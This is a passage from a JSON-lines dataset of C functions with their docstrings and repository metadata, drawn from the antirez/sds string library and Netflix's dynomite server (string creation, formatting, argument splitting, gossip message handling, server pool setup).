"bsd-2-clause", "language": "c", "size": 84}
{"docstring": "/* Create an sds string from a long long value. It is much faster than:\n *\n * sdscatprintf(sdsempty(),\"%lld\\n\", value);\n */\n", "func_signal": "sds sdsfromlonglong(long long value)", "code": "{\n    char buf[SDS_LLSTR_SIZE];\n    int len = sdsll2str(buf,value);\n\n    return sdsnewlen(buf,len);\n}", "path": "sds/sds.c", "commit_date": "2019-11-26 00:00:00", "repo_name": "antirez/sds", "stars": 4725, "license": "bsd-2-clause", "language": "c", "size": 84}
{"docstring": "/* Apply toupper() to every character of the sds string 's'. */\n", "func_signal": "void sdstoupper(sds s)", "code": "{\n    size_t len = sdslen(s), j;\n\n    for (j = 0; j < len; j++) s[j] = toupper(s[j]);\n}", "path": "sds/sds.c", "commit_date": "2019-11-26 00:00:00", "repo_name": "antirez/sds", "stars": 4725, "license": "bsd-2-clause", "language": "c", "size": 84}
{"docstring": "/* Like sdsjoin, but joins an array of SDS strings. */\n", "func_signal": "sds sdsjoinsds(sds *argv, int argc, const char *sep, size_t seplen)", "code": "{\n    sds join = sdsempty();\n    int j;\n\n    for (j = 0; j < argc; j++) {\n        join = sdscatsds(join, argv[j]);\n        if (j != argc-1) join = sdscatlen(join,sep,seplen);\n    }\n    return join;\n}", "path": "sds/sds.c", "commit_date": "2019-11-26 00:00:00", "repo_name": "antirez/sds", "stars": 4725, "license": "bsd-2-clause", "language": "c", "size": 84}
{"docstring": "/* Apply tolower() to every character of the sds string 's'. */\n", "func_signal": "void sdstolower(sds s)", "code": "{\n    size_t len = sdslen(s), j;\n\n    for (j = 0; j < len; j++) s[j] = tolower(s[j]);\n}", "path": "sds/sds.c", "commit_date": "2019-11-26 00:00:00", "repo_name": "antirez/sds", "stars": 4725, "license": "bsd-2-clause", "language": "c", "size": 84}
{"docstring": "/* Modify an sds string in-place to make it empty (zero length).\n * However all the existing buffer is not discarded but set as free space\n * so that next append operations will not require allocations up to the\n * number of bytes previously available. */\n", "func_signal": "void sdsclear(sds s)", "code": "{\n    sdssetlen(s, 0);\n    s[0] = '\\0';\n}", "path": "sds/sds.c", "commit_date": "2019-11-26 00:00:00", "repo_name": "antirez/sds", "stars": 4725, "license": "bsd-2-clause", "language": "c", "size": 84}
{"docstring": "/* Set the sds string length to the length as obtained with strlen(), so\n * considering as content only up to the first null term character.\n *\n * This function is useful when the sds string is hacked manually in some\n * way, like in the following example:\n *\n * s = sdsnew(\"foobar\");\n * s[2] = '\\0';\n * sdsupdatelen(s);\n * printf(\"%d\\n\", sdslen(s));\n *\n * The output will be \"2\", but if we comment out the call to sdsupdatelen()\n * the output will be \"6\" as the string was modified but the logical length\n * remains 6 bytes. */\n", "func_signal": "void sdsupdatelen(sds s)", "code": "{\n    size_t reallen = strlen(s);\n    sdssetlen(s, reallen);\n}", "path": "sds/sds.c", "commit_date": "2019-11-26 00:00:00", "repo_name": "antirez/sds", "stars": 4725, "license": "bsd-2-clause", "language": "c", "size": 84}
{"docstring": "/* Append the specified binary-safe string pointed by 't' of 'len' bytes to the\n * end of the specified sds string 's'.\n *\n * After the call, the passed sds string is no longer valid and all the\n * references must be substituted with the new pointer returned by the call. */\n", "func_signal": "sds sdscatlen(sds s, const void *t, size_t len)", "code": "{\n    size_t curlen = sdslen(s);\n\n    s = sdsMakeRoomFor(s,len);\n    if (s == NULL) return NULL;\n    memcpy(s+curlen, t, len);\n    sdssetlen(s, curlen+len);\n    s[curlen+len] = '\\0';\n    return s;\n}", "path": "sds/sds.c", "commit_date": "2019-11-26 00:00:00", "repo_name": "antirez/sds", "stars": 4725, "license": "bsd-2-clause", "language": "c", "size": 84}
{"docstring": "/* This function is similar to sdscatprintf, but much faster as it does\n * not rely on sprintf() family functions implemented by the libc that\n * are often very slow. Moreover directly handling the sds string as\n * new data is concatenated provides a performance improvement.\n *\n * However this function only handles an incompatible subset of printf-alike\n * format specifiers:\n *\n * %s - C String\n * %S - SDS string\n * %i - signed int\n * %I - 64 bit signed integer (long long, int64_t)\n * %u - unsigned int\n * %U - 64 bit unsigned integer (unsigned long long, uint64_t)\n * %% - Verbatim \"%\" character.\n */\n", "func_signal": "sds sdscatfmt(sds s, char const *fmt, ...)", "code": "{\n    size_t initlen = sdslen(s);\n    const char *f = fmt;\n    long i;\n    va_list ap;\n\n    /* To avoid continuous reallocations, let's start with a buffer that\n     * can hold at least two times the format string itself. It's not the\n     * best heuristic but seems to work in practice. */\n    s = sdsMakeRoomFor(s, initlen + strlen(fmt)*2);\n    va_start(ap,fmt);\n    f = fmt;    /* Next format specifier byte to process. */\n    i = initlen; /* Position of the next byte to write to dest str. */\n    while(*f) {\n        char next, *str;\n        size_t l;\n        long long num;\n        unsigned long long unum;\n\n        /* Make sure there is always space for at least 1 char. */\n        if (sdsavail(s)==0) {\n            s = sdsMakeRoomFor(s,1);\n        }\n\n        switch(*f) {\n        case '%':\n            next = *(f+1);\n            f++;\n            switch(next) {\n            case 's':\n            case 'S':\n                str = va_arg(ap,char*);\n                l = (next == 's') ? strlen(str) : sdslen(str);\n                if (sdsavail(s) < l) {\n                    s = sdsMakeRoomFor(s,l);\n                }\n                memcpy(s+i,str,l);\n                sdsinclen(s,l);\n                i += l;\n                break;\n            case 'i':\n            case 'I':\n                if (next == 'i')\n                    num = va_arg(ap,int);\n                else\n                    num = va_arg(ap,long long);\n                {\n                    char buf[SDS_LLSTR_SIZE];\n                    l = sdsll2str(buf,num);\n                    if (sdsavail(s) < l) {\n                        s = sdsMakeRoomFor(s,l);\n                    }\n                    memcpy(s+i,buf,l);\n                    sdsinclen(s,l);\n                    i += l;\n                }\n                break;\n            case 'u':\n            case 'U':\n                if (next == 'u')\n                    unum = va_arg(ap,unsigned int);\n                else\n                    unum = va_arg(ap,unsigned long long);\n                {\n                    char buf[SDS_LLSTR_SIZE];\n                    l = sdsull2str(buf,unum);\n                    if (sdsavail(s) < l) {\n                        s = sdsMakeRoomFor(s,l);\n                    }\n                    memcpy(s+i,buf,l);\n                    sdsinclen(s,l);\n                    i += l;\n                }\n                break;\n            default: /* Handle %% and generally %<unknown>. */\n                s[i++] = next;\n                sdsinclen(s,1);\n                break;\n            }\n            break;\n        default:\n            s[i++] = *f;\n            sdsinclen(s,1);\n            break;\n        }\n        f++;\n    }\n    va_end(ap);\n\n    /* Add null-term */\n    s[i] = '\\0';\n    return s;\n}", "path": "sds/sds.c", "commit_date": "2019-11-26 00:00:00", "repo_name": "antirez/sds", "stars": 4725, "license": "bsd-2-clause", "language": "c", "size": 84}
{"docstring": "/* Helper function for sdssplitargs() that converts a hex digit into an\n * integer from 0 to 15 */\n", "func_signal": "int hex_digit_to_int(char c)", "code": "{\n    switch(c) {\n    case '0': return 0;\n    case '1': return 1;\n    case '2': return 2;\n    case '3': return 3;\n    case '4': return 4;\n    case '5': return 5;\n    case '6': return 6;\n    case '7': return 7;\n    case '8': return 8;\n    case '9': return 9;\n    case 'a': case 'A': return 10;\n    case 'b': case 'B': return 11;\n    case 'c': case 'C': return 12;\n    case 'd': case 'D': return 13;\n    case 'e': case 'E': return 14;\n    case 'f': case 'F': return 15;\n    default: return 0;\n    }\n}", "path": "sds/sds.c", "commit_date": "2019-11-26 00:00:00", "repo_name": "antirez/sds", "stars": 4725, "license": "bsd-2-clause", "language": "c", "size": 84}
{"docstring": "/* Split a line into arguments, where every argument can be in the\n * following programming-language REPL-alike form:\n *\n * foo bar \"newline are supported\\n\" and \"\\xff\\x00otherstuff\"\n *\n * The number of arguments is stored into *argc, and an array\n * of sds is returned.\n *\n * The caller should free the resulting array of sds strings with\n * sdsfreesplitres().\n *\n * Note that sdscatrepr() is able to convert back a string into\n * a quoted string in the same format sdssplitargs() is able to parse.\n *\n * The function returns the allocated tokens on success, even when the\n * input string is empty, or NULL if the input contains unbalanced\n * quotes or closed quotes followed by non space characters\n * as in: \"foo\"bar or \"foo'\n */\n", "func_signal": "sds *sdssplitargs(const char *line, int *argc)", "code": "{\n    const char *p = line;\n    char *current = NULL;\n    char **vector = NULL;\n\n    *argc = 0;\n    while(1) {\n        /* skip blanks */\n        while(*p && isspace(*p)) p++;\n        if (*p) {\n            /* get a token */\n            int inq=0;  /* set to 1 if we are in \"quotes\" */\n            int insq=0; /* set to 1 if we are in 'single quotes' */\n            int done=0;\n\n            if (current == NULL) current = sdsempty();\n            while(!done) {\n                if (inq) {\n                    if (*p == '\\\\' && *(p+1) == 'x' &&\n                                             is_hex_digit(*(p+2)) &&\n                                             is_hex_digit(*(p+3)))\n                    {\n                        unsigned char byte;\n\n                        byte = (hex_digit_to_int(*(p+2))*16)+\n                                hex_digit_to_int(*(p+3));\n                        current = sdscatlen(current,(char*)&byte,1);\n                        p += 3;\n                    } else if (*p == '\\\\' && *(p+1)) {\n                        char c;\n\n                        p++;\n                        switch(*p) {\n                        case 'n': c = '\\n'; break;\n                        case 'r': c = '\\r'; break;\n                        case 't': c = '\\t'; break;\n                        case 'b': c = '\\b'; break;\n                        case 'a': c = '\\a'; break;\n                        default: c = *p; break;\n                        }\n                        current = sdscatlen(current,&c,1);\n                    } else if (*p == '\"') {\n                        /* closing quote must be followed by a space or\n                         * nothing at all. */\n                        if (*(p+1) && !isspace(*(p+1))) goto err;\n                        done=1;\n                    } else if (!*p) {\n                        /* unterminated quotes */\n                        goto err;\n                    } else {\n                        current = sdscatlen(current,p,1);\n                    }\n                } else if (insq) {\n                    if (*p == '\\\\' && *(p+1) == '\\'') {\n                        p++;\n                        current = sdscatlen(current,\"'\",1);\n                    } else if (*p == '\\'') {\n                        /* closing quote must be followed by a space or\n                         * nothing at all. */\n                        if (*(p+1) && !isspace(*(p+1))) goto err;\n                        done=1;\n                    } else if (!*p) {\n                        /* unterminated quotes */\n                        goto err;\n                    } else {\n                        current = sdscatlen(current,p,1);\n                    }\n                } else {\n                    switch(*p) {\n                    case ' ':\n                    case '\\n':\n                    case '\\r':\n                    case '\\t':\n                    case '\\0':\n                        done=1;\n                        break;\n                    case '\"':\n                        inq=1;\n                        break;\n                    case '\\'':\n                        insq=1;\n                        break;\n                    default:\n                        current = sdscatlen(current,p,1);\n                        break;\n                    }\n                }\n                if (*p) p++;\n            }\n            /* add the token to the vector */\n            vector = s_realloc(vector,((*argc)+1)*sizeof(char*));\n            vector[*argc] = current;\n            (*argc)++;\n            current = NULL;\n        } else {\n            /* Even on empty input string return something not NULL. */\n            if (vector == NULL) vector = s_malloc(sizeof(void*));\n            return vector;\n        }\n    }\n\nerr:\n    while((*argc)--)\n        sdsfree(vector[*argc]);\n    s_free(vector);\n    if (current) sdsfree(current);\n    *argc = 0;\n    return NULL;\n}", "path": "sds/sds.c", "commit_date": "2019-11-26 00:00:00", "repo_name": "antirez/sds", "stars": 4725, "license": "bsd-2-clause", "language": "c", "size": 84}
{"docstring": "/* Free the result returned by sdssplitlen(), or do nothing if 'tokens' is NULL. */\n", "func_signal": "void sdsfreesplitres(sds *tokens, int count)", "code": "{\n    if (!tokens) return;\n    while(count--)\n        sdsfree(tokens[count]);\n    s_free(tokens);\n}", "path": "sds/sds.c", "commit_date": "2019-11-26 00:00:00", "repo_name": "antirez/sds", "stars": 4725, "license": "bsd-2-clause", "language": "c", "size": 84}
{"docstring": "/* Increment the sds length and decrements the left free space at the\n * end of the string according to 'incr'. Also set the null term\n * in the new end of the string.\n *\n * This function is used in order to fix the string length after the\n * user calls sdsMakeRoomFor(), writes something after the end of\n * the current string, and finally needs to set the new length.\n *\n * Note: it is possible to use a negative increment in order to\n * right-trim the string.\n *\n * Usage example:\n *\n * Using sdsIncrLen() and sdsMakeRoomFor() it is possible to mount the\n * following schema, to cat bytes coming from the kernel to the end of an\n * sds string without copying into an intermediate buffer:\n *\n * oldlen = sdslen(s);\n * s = sdsMakeRoomFor(s, BUFFER_SIZE);\n * nread = read(fd, s+oldlen, BUFFER_SIZE);\n * ... check for nread <= 0 and handle it ...\n * sdsIncrLen(s, nread);\n */\n", "func_signal": "void sdsIncrLen(sds s, ssize_t incr)", "code": "{\n    unsigned char flags = s[-1];\n    size_t len;\n    switch(flags&SDS_TYPE_MASK) {\n        case SDS_TYPE_5: {\n            unsigned char *fp = ((unsigned char*)s)-1;\n            unsigned char oldlen = SDS_TYPE_5_LEN(flags);\n            assert((incr > 0 && oldlen+incr < 32) || (incr < 0 && oldlen >= (unsigned int)(-incr)));\n            *fp = SDS_TYPE_5 | ((oldlen+incr) << SDS_TYPE_BITS);\n            len = oldlen+incr;\n            break;\n        }\n        case SDS_TYPE_8: {\n            SDS_HDR_VAR(8,s);\n            assert((incr >= 0 && sh->alloc-sh->len >= incr) || (incr < 0 && sh->len >= (unsigned int)(-incr)));\n            len = (sh->len += incr);\n            break;\n        }\n        case SDS_TYPE_16: {\n            SDS_HDR_VAR(16,s);\n            assert((incr >= 0 && sh->alloc-sh->len >= incr) || (incr < 0 && sh->len >= (unsigned int)(-incr)));\n            len = (sh->len += incr);\n            break;\n        }\n        case SDS_TYPE_32: {\n            SDS_HDR_VAR(32,s);\n            assert((incr >= 0 && sh->alloc-sh->len >= (unsigned int)incr) || (incr < 0 && sh->len >= (unsigned int)(-incr)));\n            len = (sh->len += incr);\n            break;\n        }\n        case SDS_TYPE_64: {\n            SDS_HDR_VAR(64,s);\n            assert((incr >= 0 && sh->alloc-sh->len >= (uint64_t)incr) || (incr < 0 && sh->len >= (uint64_t)(-incr)));\n            len = (sh->len += incr);\n            break;\n        }\n        default: len = 0; /* Just to avoid compilation warnings. */\n    }\n    s[len] = '\\0';\n}", "path": "sds/sds.c", "commit_date": "2019-11-26 00:00:00", "repo_name": "antirez/sds", "stars": 4725, "license": "bsd-2-clause", "language": "c", "size": 84}
{"docstring": "/* Remove the part of the string from left and from right composed just of\n * contiguous characters found in 'cset', that is a null terminted C string.\n *\n * After the call, the modified sds string is no longer valid and all the\n * references must be substituted with the new pointer returned by the call.\n *\n * Example:\n *\n * s = sdsnew(\"AA...AA.a.aa.aHelloWorld     :::\");\n * s = sdstrim(s,\"Aa. :\");\n * printf(\"%s\\n\", s);\n *\n * Output will be just \"HelloWorld\".\n */\n", "func_signal": "sds sdstrim(sds s, const char *cset)", "code": "{\n    char *start, *end, *sp, *ep;\n    size_t len;\n\n    sp = start = s;\n    ep = end = s+sdslen(s)-1;\n    while(sp <= end && strchr(cset, *sp)) sp++;\n    while(ep > sp && strchr(cset, *ep)) ep--;\n    len = (sp > ep) ? 0 : ((ep-sp)+1);\n    if (s != sp) memmove(s, sp, len);\n    s[len] = '\\0';\n    sdssetlen(s,len);\n    return s;\n}", "path": "sds/sds.c", "commit_date": "2019-11-26 00:00:00", "repo_name": "antirez/sds", "stars": 4725, "license": "bsd-2-clause", "language": "c", "size": 84}
{"docstring": "/* Create a new sds string with the content specified by the 'init' pointer\n * and 'initlen'.\n * If NULL is used for 'init' the string is initialized with zero bytes.\n * If SDS_NOINIT is used, the buffer is left uninitialized;\n *\n * The string is always null-termined (all the sds strings are, always) so\n * even if you create an sds string with:\n *\n * mystring = sdsnewlen(\"abc\",3);\n *\n * You can print the string with printf() as there is an implicit \\0 at the\n * end of the string. However the string is binary safe and can contain\n * \\0 characters in the middle, as the length is stored in the sds header. */\n", "func_signal": "sds sdsnewlen(const void *init, size_t initlen)", "code": "{\n    void *sh;\n    sds s;\n    char type = sdsReqType(initlen);\n    /* Empty strings are usually created in order to append. Use type 8\n     * since type 5 is not good at this. */\n    if (type == SDS_TYPE_5 && initlen == 0) type = SDS_TYPE_8;\n    int hdrlen = sdsHdrSize(type);\n    unsigned char *fp; /* flags pointer. */\n\n    sh = s_malloc(hdrlen+initlen+1);\n    if (sh == NULL) return NULL;\n    if (init==SDS_NOINIT)\n        init = NULL;\n    else if (!init)\n        memset(sh, 0, hdrlen+initlen+1);\n    s = (char*)sh+hdrlen;\n    fp = ((unsigned char*)s)-1;\n    switch(type) {\n        case SDS_TYPE_5: {\n            *fp = type | (initlen << SDS_TYPE_BITS);\n            break;\n        }\n        case SDS_TYPE_8: {\n            SDS_HDR_VAR(8,s);\n            sh->len = initlen;\n            sh->alloc = initlen;\n            *fp = type;\n            break;\n        }\n        case SDS_TYPE_16: {\n            SDS_HDR_VAR(16,s);\n            sh->len = initlen;\n            sh->alloc = initlen;\n            *fp = type;\n            break;\n        }\n        case SDS_TYPE_32: {\n            SDS_HDR_VAR(32,s);\n            sh->len = initlen;\n            sh->alloc = initlen;\n            *fp = type;\n            break;\n        }\n        case SDS_TYPE_64: {\n            SDS_HDR_VAR(64,s);\n            sh->len = initlen;\n            sh->alloc = initlen;\n            *fp = type;\n            break;\n        }\n    }\n    if (initlen && init)\n        memcpy(s, init, initlen);\n    s[initlen] = '\\0';\n    return s;\n}", "path": "sds/sds.c", "commit_date": "2019-11-26 00:00:00", "repo_name": "antirez/sds", "stars": 4725, "license": "bsd-2-clause", "language": "c", "size": 84}
{"docstring": "/* Create a new sds string starting from a null terminated C string. */\n", "func_signal": "sds sdsnew(const char *init)", "code": "{\n    size_t initlen = (init == NULL) ? 0 : strlen(init);\n    return sdsnewlen(init, initlen);\n}", "path": "sds/sds.c", "commit_date": "2019-11-26 00:00:00", "repo_name": "antirez/sds", "stars": 4725, "license": "bsd-2-clause", "language": "c", "size": 84}
{"docstring": "/*\n * return : true to bypass all processing from the stack\n *          false to go through the whole stack to process a given msg\n */\n", "func_signal": "bool dmsg_process(struct context *ctx, struct conn *conn, struct dmsg *dmsg)", "code": "{\n  ASSERT(dmsg != NULL);\n  ASSERT(conn->dyn_mode);\n\n  switch (dmsg->type) {\n    case GOSSIP_SYN:\n      log_debug(LOG_DEBUG, \"I have got a GOSSIP_SYN!!!!!!\");\n      dmsg_dump(dmsg);\n      // TODOs: fix this to reply the 1st time sender\n      // dnode_rsp_gos_syn(ctx, conn, dmsg->owner);\n      dmsg_parse(dmsg);\n      return true;\n\n    case CRYPTO_HANDSHAKE:\n      log_debug(LOG_DEBUG,\n                \"I have a crypto handshake msg and processing it now\");\n      // TODOs: will work on this to optimize the performance\n      return true;\n\n    case GOSSIP_SYN_REPLY:\n      log_debug(LOG_DEBUG, \"I have got a GOSSIP_SYN_REPLY!!!!!!\");\n\n      return true;\n    default:\n      log_debug(LOG_DEBUG, \"nothing to do\");\n  }\n\n  return false;\n}", "path": "dynomite/src/dyn_dnode_msg.c", "commit_date": "2019-05-21 00:00:00", "repo_name": "Netflix/dynomite", "stars": 4152, "license": "apache-2.0", "language": "c", "size": 8887}
{"docstring": "// Used in gossip forwarding msg only for now\n", "func_signal": "rstatus_t dmsg_write_mbuf(struct mbuf *mbuf, uint64_t msg_id, uint8_t type,\n                          struct conn *conn, uint32_t plen)", "code": "{\n  mbuf_write_string(mbuf, &MAGIC_STR);\n  mbuf_write_uint64(mbuf, msg_id);\n  mbuf_write_char(mbuf, ' ');\n  mbuf_write_uint8(mbuf, type);\n  mbuf_write_char(mbuf, ' ');\n\n  // encryption bit\n  if (conn->dnode_secured) {\n    mbuf_write_uint8(mbuf, 1);\n  } else {\n    mbuf_write_uint8(mbuf, 0);\n  }\n\n  mbuf_write_char(mbuf, ' ');\n  mbuf_write_uint8(mbuf, version);\n\n  // same-dc\n  mbuf_write_char(mbuf, ' ');\n  if (conn->same_dc)\n    mbuf_write_uint8(mbuf, 1);\n  else\n    mbuf_write_uint8(mbuf, 0);\n\n  // mbuf_write_string(mbuf, &CRLF_STR);\n  mbuf_write_char(mbuf, ' ');\n  mbuf_write_char(mbuf, '*');\n\n  // write aes key\n  unsigned char *aes_key = conn->aes_key;\n  if (conn->dnode_secured) {\n    mbuf_write_uint32(mbuf, (uint32_t)dyn_rsa_size());\n  } else {\n    mbuf_write_uint32(mbuf, 1);\n  }\n\n  mbuf_write_char(mbuf, ' ');\n  // mbuf_write_mbuf(mbuf, data);\n  if (conn->dnode_secured) {\n    dyn_rsa_encrypt(aes_key, aes_encrypted_buf);\n    mbuf_write_bytes(mbuf, aes_encrypted_buf, dyn_rsa_size());\n  } else {\n    mbuf_write_char(mbuf, 'a');  // TODOs: replace with another string\n  }\n\n  // mbuf_write_string(mbuf, &CRLF_STR);\n  mbuf_write_char(mbuf, ' ');\n  mbuf_write_char(mbuf, '*');\n  mbuf_write_uint32(mbuf, plen);\n\n  mbuf_write_string(mbuf, &CRLF_STR);\n\n  return DN_OK;\n}", "path": "dynomite/src/dyn_dnode_msg.c", "commit_date": "2019-05-21 00:00:00", "repo_name": "Netflix/dynomite", "stars": 4152, "license": "apache-2.0", "language": "c", "size": 8887}
{"docstring": "/**\n *\n * NOTE: DEPRECATED and not currently used in the codebase.\n *\n * Initialize anti-entropy.\n * @param[in,out] ctx Context.\n * @return rstatus_t Return status code.\n */\n", "func_signal": "static rstatus_t core_entropy_init(struct context *ctx)", "code": "{\n  struct instance *nci = ctx->instance;\n  /* initializing anti-entropy */\n  ctx->entropy = entropy_init(ctx, nci->entropy_port, nci->entropy_addr);\n  if (ctx->entropy == NULL) {\n    log_error(\"Failed to create entropy!!!\");\n  }\n\n  return DN_OK;\n}", "path": "dynomite/src/dyn_core.c", "commit_date": "2019-10-30 00:00:00", "repo_name": "Netflix/dynomite", "stars": 4152, "license": "apache-2.0", "language": "c", "size": 8887}
{"docstring": "/**\n * Initialize crypto and create the Dynomite server performance statistics.\n * @param[in,out] ctx Dynomite server context.\n * @return rstatus_t Return status code.\n */\n", "func_signal": "static rstatus_t core_crypto_init(struct context *ctx)", "code": "{\n  /* crypto init */\n  THROW_STATUS(crypto_init(&ctx->pool));\n  return DN_OK;\n}", "path": "dynomite/src/dyn_core.c", "commit_date": "2019-10-30 00:00:00", "repo_name": "Netflix/dynomite", "stars": 4152, "license": "apache-2.0", "language": "c", "size": 8887}
{"docstring": "/**\n * Create a context for the dynomite process.\n * @param[in,out] nci Dynomite instance.\n * @return rstatus_t Return status code.\n */\n", "func_signal": "static rstatus_t core_ctx_create(struct instance *nci)", "code": "{\n  struct context *ctx;\n\n  srand((unsigned)time(NULL));\n\n  ctx = dn_alloc(sizeof(*ctx));\n  if (ctx == NULL) {\n    loga(\"Failed to create context!!!\");\n    return DN_ERROR;\n  }\n\n  nci->ctx = ctx;\n  ctx->instance = nci;\n  ctx->cf = NULL;\n  ctx->stats = NULL;\n  ctx->evb = NULL;\n  ctx->dyn_state = INIT;\n  ctx->admin_opt = admin_opt;\n\n  /* parse and create configuration */\n  ctx->cf = conf_create(nci->conf_filename);\n  if (ctx->cf == NULL) {\n    loga(\"Failed to create conf!!!\");\n    dn_free(ctx);\n    return DN_ERROR;\n  }\n\n  struct conf_pool *cp = &ctx->cf->pool;\n  ctx->max_timeout = cp->stats_interval;\n  ctx->timeout = ctx->max_timeout;\n\n  return DN_OK;\n}", "path": "dynomite/src/dyn_core.c", "commit_date": "2019-10-30 00:00:00", "repo_name": "Netflix/dynomite", "stars": 4152, "license": "apache-2.0", "language": "c", "size": 8887}
{"docstring": "/**\n * Initialize the server pool.\n * @param[in,out] ctx Context.\n * @return rstatus_t Return status code.\n */\n", "func_signal": "static rstatus_t core_server_pool_init(struct context *ctx)", "code": "{\n  THROW_STATUS(server_pool_init(&ctx->pool, &ctx->cf->pool, ctx));\n  return DN_OK;\n}", "path": "dynomite/src/dyn_core.c", "commit_date": "2019-10-30 00:00:00", "repo_name": "Netflix/dynomite", "stars": 4152, "license": "apache-2.0", "language": "c", "size": 8887}
{"docstring": "/**\n * Deinitialize connections, message queue, memory buffers and destroy the\n * context.\n * @param[in] ctx Dynomite process context.\n */\n", "func_signal": "void core_stop(struct context *ctx)", "code": "{\n  conn_deinit();\n  msg_deinit();\n  dmsg_deinit();\n  mbuf_deinit();\n  core_ctx_destroy(ctx);\n}", "path": "dynomite/src/dyn_core.c", "commit_date": "2019-10-30 00:00:00", "repo_name": "Netflix/dynomite", "stars": 4152, "license": "apache-2.0", "language": "c", "size": 8887}
{"docstring": "/**\n * Initialize the server pool.\n * @param[in,out] sp Server pool configuration.\n * @param[in] cp Connection pool configuration.\n * @param[in] ctx Context.\n * @return rstatus_t Return status code.\n */\n", "func_signal": "rstatus_t server_pool_init(struct server_pool *sp, struct conf_pool *cp,\n                           struct context *ctx)", "code": "{\n  ASSERT(cp->valid);\n\n  memset(sp, 0, sizeof(struct server_pool));\n  init_object(&sp->object, OBJ_POOL, print_server_pool);\n  sp->ctx = ctx;\n  sp->p_conn = NULL;\n  TAILQ_INIT(&sp->c_conn_q);\n  TAILQ_INIT(&sp->ready_conn_q);\n\n  array_null(&sp->datacenters);\n  /* sp->ncontinuum = 0; */\n  /* sp->nserver_continuum = 0; */\n  /* sp->continuum = NULL; */\n  sp->next_rebuild = 0ULL;\n\n  sp->name = cp->name;\n  sp->proxy_endpoint.pname = cp->listen.pname;\n  sp->proxy_endpoint.port = (uint16_t)cp->listen.port;\n\n  sp->proxy_endpoint.family = cp->listen.info.family;\n  sp->proxy_endpoint.addrlen = cp->listen.info.addrlen;\n  sp->proxy_endpoint.addr = (struct sockaddr *)&cp->listen.info.addr;\n\n  sp->key_hash_type = cp->hash;\n  sp->key_hash = get_hash_func(cp->hash);\n  sp->hash_tag = cp->hash_tag;\n\n  g_data_store = cp->data_store;\n  if ((g_data_store != DATA_REDIS) && (g_data_store != DATA_MEMCACHE)) {\n    log_error(\"Invalid datastore in conf file\");\n    return DN_ERROR;\n  }\n  set_datastore_ops();\n  sp->timeout = cp->timeout;\n  sp->backlog = cp->backlog;\n\n  sp->client_connections = (uint32_t)cp->client_connections;\n\n  sp->server_retry_timeout_ms = cp->server_retry_timeout_ms;\n  sp->server_failure_limit = (uint8_t)cp->server_failure_limit;\n  sp->auto_eject_hosts = cp->auto_eject_hosts ? 1 : 0;\n  sp->preconnect = cp->preconnect ? 1 : 0;\n\n  sp->datastore = dn_zalloc(sizeof(*sp->datastore));\n  init_object(&(sp->datastore->obj), OBJ_DATASTORE, _print_datastore);\n  THROW_STATUS(conf_datastore_transform(sp->datastore, cp, cp->conf_datastore));\n  sp->datastore->owner = sp;\n  log_debug(LOG_DEBUG, \"init datastore in pool '%.*s'\", sp->name.len,\n            sp->name.data);\n\n  /* dynomite init */\n  sp->seed_provider = cp->dyn_seed_provider;\n  sp->dnode_proxy_endpoint.pname = cp->dyn_listen.pname;\n  sp->dnode_proxy_endpoint.port = (uint16_t)cp->dyn_listen.port;\n  sp->dnode_proxy_endpoint.family = cp->dyn_listen.info.family;\n  sp->dnode_proxy_endpoint.addrlen = cp->dyn_listen.info.addrlen;\n  sp->dnode_proxy_endpoint.addr = (struct sockaddr *)&cp->dyn_listen.info.addr;\n  sp->max_local_peer_connections = cp->local_peer_connections;\n  sp->max_remote_peer_connections = cp->remote_peer_connections;\n  sp->rack = cp->rack;\n  sp->dc = cp->dc;\n  sp->tokens = cp->tokens;\n  sp->env = cp->env;\n  sp->enable_gossip = cp->enable_gossip;\n\n  /* dynomite stats init */\n  sp->stats_endpoint.pname = cp->stats_listen.pname;\n  sp->stats_endpoint.port = (uint16_t)cp->stats_listen.port;\n  sp->stats_endpoint.family = cp->stats_listen.info.family;\n  sp->stats_endpoint.addrlen = cp->stats_listen.info.addrlen;\n  sp->stats_endpoint.addr = (struct sockaddr *)&cp->stats_listen.info.addr;\n  sp->stats_interval = cp->stats_interval;\n  sp->mbuf_size = cp->mbuf_size;\n  sp->alloc_msgs_max = cp->alloc_msgs_max;\n\n  sp->secure_server_option =\n      get_secure_server_option(&cp->secure_server_option);\n  sp->pem_key_file = cp->pem_key_file;\n  sp->recon_key_file = cp->recon_key_file;\n  sp->recon_iv_file = cp->recon_iv_file;\n\n  array_null(&sp->peers);\n  array_init(&sp->datacenters, 1, sizeof(struct datacenter));\n  sp->conf_pool = cp;\n\n  /* gossip */\n  sp->g_interval = cp->gos_interval;\n\n  set_msgs_per_sec(cp->conn_msg_rate);\n\n  log_debug(LOG_VERB, \"transform to pool '%.*s'\", sp->name.len, sp->name.data);\n\n  sp->ctx = ctx;\n  struct datastore *datastore = sp->datastore;\n  datastore->conn_pool = conn_pool_create(\n      ctx, datastore, datastore->max_connections, init_server_conn,\n      sp->server_failure_limit, sp->server_retry_timeout_ms / 1000);\n  log_debug(LOG_DEBUG, \"Initialized server pool\");\n  return DN_OK;\n}", "path": "dynomite/src/dyn_server.c", "commit_date": "2019-10-22 00:00:00", "repo_name": "Netflix/dynomite", "stars": 4152, "license": "apache-2.0", "language": "c", "size": 8887}
{"docstring": "/**\n * Primary loop for the Dynomite server process.\n * @param[in] ctx Dynomite process context.\n * @return rstatus_t Return status code.\n */\n", "func_signal": "rstatus_t core_loop(struct context *ctx)", "code": "{\n  int nsd;\n\n  core_process_messages();\n\n  core_timeout(ctx);\n  execute_expired_tasks(0);\n  ctx->timeout = MIN(ctx->timeout, time_to_next_task());\n  nsd = event_wait(ctx->evb, (int)ctx->timeout);\n  if (nsd < 0) {\n    return nsd;\n  }\n\n  // go through all the ready queue and send each of them\n  /*struct server_pool *sp = &ctx->pool;\n  struct conn *conn, *nconn;\n  TAILQ_FOREACH_SAFE(conn, &sp->ready_conn_q, ready_tqe, nconn) {\n              rstatus_t status = core_send(ctx, conn);\n      if (status == DN_OK) {\n          log_debug(LOG_VVERB, \"Flushing writes on %s\", print_obj(conn));\n          conn_event_del_out(conn);\n      } else {\n          TAILQ_REMOVE(&sp->ready_conn_q, conn, ready_tqe);\n      }\n  }*/\n  stats_swap(ctx->stats);\n\n  return DN_OK;\n}", "path": "dynomite/src/dyn_core.c", "commit_date": "2019-10-30 00:00:00", "repo_name": "Netflix/dynomite", "stars": 4152, "license": "apache-2.0", "language": "c", "size": 8887}
